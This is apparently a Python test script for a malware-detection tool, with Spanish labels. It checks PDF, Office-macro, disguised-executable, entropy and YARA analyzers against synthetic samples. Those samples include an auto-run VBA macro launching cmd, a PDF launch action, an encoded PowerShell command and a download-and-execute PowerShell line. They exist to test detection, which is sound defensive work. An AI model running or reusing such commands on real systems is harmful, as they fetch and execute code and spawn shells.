import sys
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.stdout.reconfigure(encoding="utf-8")

import tempfile

from core import binary_analyzer, office_analyzer, pdf_analyzer, yara_scanner


def _tmp(suffix, data):
    fh = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    fh.write(data)
    fh.close()
    return Path(fh.name)


def _rules(result):
    return sorted(f["rule_id"] for f in result["findings"])


def check(label, got, expected):
    assert got == expected, f"{label}: esperado {expected}, obtenido {got}"
    print(f"OK  {label} -> {got}")


# 1) PDF con /JavaScript + /OpenAction
pdf_body = (
    b"%PDF-1.7\n"
    b"1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('x')) >> >>\n"
    b"trailer << /Root 1 0 R >>\n%%EOF\n"
)
pdf_path = _tmp(".pdf", pdf_body)
try:
    r = pdf_analyzer.analyze_pdf(pdf_path)
    check("pdf es_pdf", pdf_analyzer.is_pdf(pdf_path), True)
    check("pdf javascript", "pdf_javascript" in _rules(r), True)
    check("pdf openaction", "pdf_openaction" in _rules(r), True)
    check("pdf estado", r["estado"], "alerta")
finally:
    pdf_path.unlink(missing_ok=True)

# 2) PDF con /Launch
launch_pdf = _tmp(".pdf", b"%PDF-1.4\n2 0 obj << /Launch /F (evil.exe) >>\n%%EOF")
try:
    r = pdf_analyzer.analyze_pdf(launch_pdf)
    check("pdf launch", "pdf_launch" in _rules(r), True)
finally:
    launch_pdf.unlink(missing_ok=True)

# 3) docx (ZIP OOXML) con vbaProject.bin
docx_path = _tmp(".docx", b"PK\x03\x04placeholder")
buf = tempfile.NamedTemporaryFile(suffix=".docx", delete=False)
buf.close()
docx_path.unlink(missing_ok=True)
docx_path = Path(buf.name)
with zipfile.ZipFile(docx_path, "w") as zf:
    zf.writestr("[Content_Types].xml", "<Types/>")
    zf.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 100)
try:
    check("docx es_office", office_analyzer.is_office(docx_path), True)
    check("docx vba detectado", office_analyzer._zip_has_vbaproject(docx_path), True)
    r = office_analyzer.analyze_office(docx_path)
    check("docx macro", "vba_macro" in _rules(r), True)
    check("docx con macro queda en revisión", r["estado"], "pendiente")
    dropper = office_analyzer._scan_macro_source(
        ["Sub AutoOpen()\n  Shell \"cmd /c calc\"\nEnd Sub"])
    from core.scoring import verdict
    check("macro autoejecutable que lanza comandos", verdict(dropper)[2], "alerta")
finally:
    docx_path.unlink(missing_ok=True)

# 4) archivo .jpg con firma MZ (exe disfrazado) - firma falsa
fake = _tmp(".jpg", b"MZ" + b"\x90" * 200)
try:
    check("magic detecta exe", "exe" in binary_analyzer.detect_magic(open(fake, "rb").read(4096)), True)
    r = binary_analyzer.analyze_binary(fake)
    check("jpg-exe mismatch", "extension_mismatch" in _rules(r), True)
    check("jpg-exe ejecutable", "executable_content" in _rules(r), True)
    check("jpg-exe estado", r["estado"], "alerta")
    check("jpg-exe tiene sha256", len(r["meta"]["sha256"]), 64)
finally:
    fake.unlink(missing_ok=True)

# 5) binario de alta entropía (datos aleatorios)
import os as _os
random_data = _os.urandom(8192)
ent_file = _tmp(".bin", random_data)
try:
    r = binary_analyzer.analyze_binary(ent_file)
    check("entropia alta", r["meta"]["entropy"] >= 7.0, True)
    check("entropia hallazgo", "high_entropy" in _rules(r), True)
finally:
    ent_file.unlink(missing_ok=True)

# 5b) PNG fotográfico: entropía alta por diseño, no es amenaza
from PIL import Image

noisy_png = Path(tempfile.mktemp(suffix=".png"))
Image.frombytes("RGB", (320, 240), _os.urandom(320 * 240 * 3)).save(noisy_png)
try:
    r = binary_analyzer.analyze_binary(noisy_png)
    check("png ruidoso entropia alta", r["meta"]["entropy"] >= 7.0, True)
    check("png ruidoso exento", r["meta"]["entropy_exempt"], True)
    check("png ruidoso sin high_entropy", "high_entropy" in _rules(r), False)
    check("png ruidoso limpio", r["estado"], "limpio")
    check("png ruidoso score", r["score"], 0)
finally:
    noisy_png.unlink(missing_ok=True)

# 5c) JPEG fotográfico: misma exención por firma mágica
noisy_jpg = Path(tempfile.mktemp(suffix=".jpg"))
Image.frombytes("RGB", (320, 240), _os.urandom(320 * 240 * 3)).save(noisy_jpg, quality=95)
try:
    r = binary_analyzer.analyze_binary(noisy_jpg)
    check("jpg ruidoso sin high_entropy", "high_entropy" in _rules(r), False)
    check("jpg ruidoso limpio", r["estado"], "limpio")
finally:
    noisy_jpg.unlink(missing_ok=True)

# 5d) contenido aleatorio disfrazado de PNG: la cabecera no es coherente,
# así que la exención de entropía no se aplica.
fake_png = _tmp(".png", b"\x89PNG\r\n\x1a\n" + _os.urandom(8192))
try:
    r = binary_analyzer.analyze_binary(fake_png)
    check("png falso sin mismatch", "extension_mismatch" in _rules(r), False)
    check("png falso no exento", r["meta"]["entropy_exempt"], False)
    check("png falso high_entropy", "high_entropy" in _rules(r), True)
finally:
    fake_png.unlink(missing_ok=True)

# 6) EICAR vía YARA (en memoria: Defender puede confiscar el archivo en disco)
eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
yara_scanner._compile()
check("yara EICAR (memoria)", any(m.rule == "EICAR_Test_File"
      for m in yara_scanner._RULES.match(data=eicar)), True)

# 7) PowerShell encoded vía YARA
ps = b"powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA"
ps_file = _tmp(".ps1", ps)
try:
    r = yara_scanner.scan(ps_file)
    check("yara powershell", "yara_match" in _rules(r), True)
finally:
    ps_file.unlink(missing_ok=True)

# 8) download+exec via YARA
de = b"$wc = New-Object Net.WebClient; $wc.DownloadString('http://x'); Invoke-Expression $x; subprocess"
de_file = _tmp(".ps1", de)
try:
    r = yara_scanner.scan(de_file)
    check("yara download+exec", any("Download_And_Execute" in f["regla"] for f in r["findings"]), True)
finally:
    de_file.unlink(missing_ok=True)

# 9) archivo limpio (texto normal)
clean = _tmp(".txt", b"esto es una nota normal sin nada raro, solo texto plano comun y corriente.")
try:
    r = yara_scanner.scan(clean)
    check("yara limpio", _rules(r), [])
    rb = binary_analyzer.analyze_binary(clean)
    check("binary texto sin mismatch", "extension_mismatch" in _rules(rb), False)
finally:
    clean.unlink(missing_ok=True)

print("\nTodos los casos multi-formato pasaron.")
